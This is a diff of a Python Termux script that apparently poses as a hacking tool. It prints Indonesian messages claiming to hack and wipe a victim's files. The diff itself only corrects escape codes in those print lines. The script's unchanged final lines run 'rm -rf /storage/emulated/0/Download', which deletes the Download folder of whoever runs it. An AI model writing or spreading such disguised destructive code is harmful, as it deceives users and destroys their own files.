@@ -36,77 +36,77 @@ print ("\033[1;36m Sending ... 💌 ")
 os.system('termux-setup-storage')
 print (' ')
 print("\033[1;36m sedang melakukan hacking..👌 ")
-print("033[1;36m mendapat file korban.....")
-print("033[1;31m sedang menghapus data data korban...")
-print("033[1;36m mohon tunggu....")
+print("\033[1;36m mendapat file korban.....")
+print("\033[1;31m sedang menghapus data data korban...")
+print("\033[1;36m mohon tunggu....")
 
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
 
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-
-print("033[1;31m removed file....")
-
-
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
-
-
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
 
-print("033[1;31m removed file....")
+print("\033[1;31m removed file....")
 
-print("033[1;31m removed file....")
 
-print("033[1;36m target berhasil dilumpuhkan😎")
+
+print("\033[1;31m removed file....")
+
+
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+
+print("\033[1;31m removed file....")
+
+print("\033[1;31m removed file....")
+
+print("\033[1;36m target berhasil dilumpuhkan😎")
 sleep(3)
 os.system('termux-setup-storage')
 os.system('rm -rf /storage/emulated/0/Download')
